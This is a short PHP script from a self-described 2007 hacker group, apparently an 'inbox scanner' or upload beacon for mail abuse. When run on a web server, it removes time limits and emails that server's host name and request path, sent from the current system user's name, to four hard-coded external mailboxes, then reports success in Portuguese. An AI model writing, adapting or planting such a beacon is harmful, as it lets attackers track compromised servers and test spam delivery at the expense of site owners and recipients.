<?php
//=================================
//
//    scan inb0x hotmail v1.0
//
//  coded by FilhOte_Ccs and LOST
//      nao rippem fdps :]
//
//
//      Hacker Group 2007
//=================================
//
 ini_set("max_execution_time",-1);
 set_time_limit(0);
 $user = @get_current_user();
 $email = "$user";
 $assunto = "Vull.";
 $email1 = "vulljuju@hotmail.com,vulljuju@gmail.com,vullsr00x@yahoo.com.br,test.inboxx@bol.com.br";
 $headers  = "From: <$email>\r\n";


 if(mail($email1, $assunto, $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $headers)){
 echo "Opa, enviado!";
 exit();
}
 else{
 echo "Nao enviei..";
 exit();
 }
?>
